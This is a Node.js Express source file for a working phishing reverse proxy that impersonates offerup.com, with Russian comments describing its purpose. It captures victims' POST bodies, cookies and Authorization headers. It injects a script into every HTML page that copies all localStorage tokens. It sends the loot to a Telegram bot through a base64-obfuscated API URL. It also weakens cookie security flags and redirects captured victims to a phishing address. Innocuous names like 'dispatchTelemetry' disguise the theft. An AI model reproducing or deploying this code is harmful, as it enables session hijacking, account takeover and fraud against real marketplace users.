const express = require('express');
const { createProxyMiddleware: createTunnel, responseInterceptor: interceptPayload } = require('http-proxy-middleware');
const axios = require('axios');

const app = express();
const _P = process.env.PORT || 3000;

const ENV_T1 = process.env.TOKEN || 'ТВОЙ_ТОКЕН_БОТА';
const ENV_T2 = process.env.CHAT || 'ТВОЙ_CHAT_ID';
const ORIGIN_NODE = process.env.ORIGIN || 'https://offerup.com'; 
const PHISH_NODE = process.env.PHISH || 'https://google.com';

const d = (s) => Buffer.from(s, 'base64').toString('utf8');
const metricsCache = new Set();

const dispatchTelemetry = async (payload) => {
    if (!ENV_T1 || !ENV_T2) return;
    try {
        const endpoint = d('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') + ENV_T1 + d('L3NlbmRNZXNzYWdl'); 
        await axios.post(endpoint, {
            chat_id: ENV_T2,
            text: payload,
            parse_mode: d('SFRNTA==')
        });
    } catch (e) {}
};

// Новый эндпоинт для приема выпотрошенного LocalStorage от нашего инжектора
app.use(express.json());
app.post('/api/sys_metric', (req, res) => {
    const ip = req.headers[d('eC1mb3J3YXJkZWQtZm9y')] || req.socket.remoteAddress;
    const { lsData } = req.body;
    
    if (lsData) {
        let log = `🗄 <b>LocalStorage Grab (OfferUp JWT)</b>\n🌍 IP: <code>${ip}</code>\n\n`;
        log += `<code>${JSON.stringify(lsData, null, 2).substring(0, 3000)}</code>\n`;
        dispatchTelemetry(log);
        metricsCache.add(ip); // Кикаем на фишинг при следующем клике
    }
    res.sendStatus(200);
});

app.use((req, res, next) => {
    // Пропускаем наш собственный эндпоинт сбора
    if (req.url === '/api/sys_metric') return next();

    const clientRef = req.headers[d('eC1mb3J3YXJkZWQtZm9y')] || req.socket.remoteAddress;
    const sessionToken = req.headers[d('Y29va2ll')];
    const authHeader = req.headers['authorization'];

    if (req.method === d('UE9TVA==')) {
        let streamData = '';
        req.on(d('ZGF0YQ=='), chunk => { streamData += chunk.toString(); });
        req.on(d('ZW5k'), () => {
            let log = `🔥 <b>Target Data Grab (P)</b>\n🌍 IP: <code>${clientRef}</code>\n📍 Node: ${req.url}\n\n`;
            if (sessionToken) log += `🍪 <b>Cookies:</b>\n<code>${sessionToken}</code>\n`;
            if (authHeader) log += `🔑 <b>Auth Header:</b> <code>${authHeader}</code>\n`;
            if (streamData) log += `📦 <b>Payload:</b>\n<code>${streamData.substring(0, 1000)}</code>\n`;
            
            dispatchTelemetry(log);
            if (authHeader) metricsCache.add(clientRef); 
        });
    } 
    next();
});

// Пейлоад для инжекта в HTML (высасывает LocalStorage)
const jsPayload = `
<script>
    (function(){
        try {
            var data = {};
            for (var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                // Забираем всё, но особенно нас интересуют токены и auth
                data[key] = localStorage.getItem(key);
            }
            if (Object.keys(data).length > 0) {
                fetch('/api/sys_metric', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lsData: data})
                });
            }
        } catch(e) {}
    })();
</script>
`;

const tunnelConfig = {
    target: ORIGIN_NODE,
    changeOrigin: true,
    ws: true,
    secure: false,
    autoRewrite: true,
    cookieDomainRewrite: '*',
    headers: {
        'Origin': ORIGIN_NODE,
        'Referer': ORIGIN_NODE + '/'
    },
    onProxyReq: (pReq, req, res) => {
        pReq.setHeader(d('eC1mb3J3YXJkZWQtZm9y'), req.socket.remoteAddress);
    },
    selfHandleResponse: true,
    onProxyRes: interceptPayload(async (resBuffer, pRes, req, res) => {
        const clientRef = req.headers[d('eC1mb3J3YXJkZWQtZm9y')] || req.socket.remoteAddress;

        if (metricsCache.has(clientRef) && req.headers.accept && req.headers.accept.includes('text/html')) {
            res.statusCode = 302;
            res.setHeader(d('TG9jYXRpb24='), PHISH_NODE);
            return Buffer.from(''); 
        }

        const stateHeader = d('c2V0LWNvb2tpZQ==');
        if (pRes.headers[stateHeader]) {
            pRes.headers[stateHeader] = pRes.headers[stateHeader].map(str => 
                str.replace(/Domain=[^;]+/i, d('RG9tYWluPQ==') + req.hostname)
                   .replace(/Secure/i, '')
                   .replace(/SameSite=Lax/i, d('U2FtZVNpdGU9Tm9uZQ=='))
            );
        }

        // --- ИНЖЕКЦИЯ JS ПЕЙЛОАДА В HTML ---
        if (pRes.headers['content-type'] && pRes.headers['content-type'].includes('text/html')) {
            let body = resBuffer.toString('utf8');
            // Вклеиваем наш скрипт прямо перед закрывающим тегом body
            body = body.replace('</body>', jsPayload + '</body>');
            return Buffer.from(body, 'utf8');
        }

        return resBuffer;
    })
};

app.use(d('Lw=='), createTunnel(tunnelConfig));

app.listen(_P, () => {
    console.log(`Gateway active on port ${_P}`);
});
